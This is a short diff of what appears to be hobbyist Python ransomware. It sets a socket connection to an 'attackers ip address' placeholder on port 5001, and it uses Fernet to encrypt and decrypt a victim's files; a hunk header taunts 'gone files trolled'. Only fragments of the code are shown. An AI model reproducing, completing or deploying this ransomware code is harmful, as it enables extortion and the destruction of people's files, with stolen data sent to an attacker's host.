@@ -22,7 +22,7 @@ import socket
 
 SEPARATOR = "<SEPARATOR>"
 BUFFER_SIZE = 4096
-host = "YOUR IP ADDRESS"
+host = "attackers ip address"
 port = 5001
 
 
@@ -179,6 +179,7 @@ heheheh hakcinged hehehe gone files trolled
                     self.key = f.read()
                     self.crypter = Fernet(self.key)
                     self.crypt_system(encrypted=True)
+                    
                     print('decrypted')
                     break
             except Exception as e:
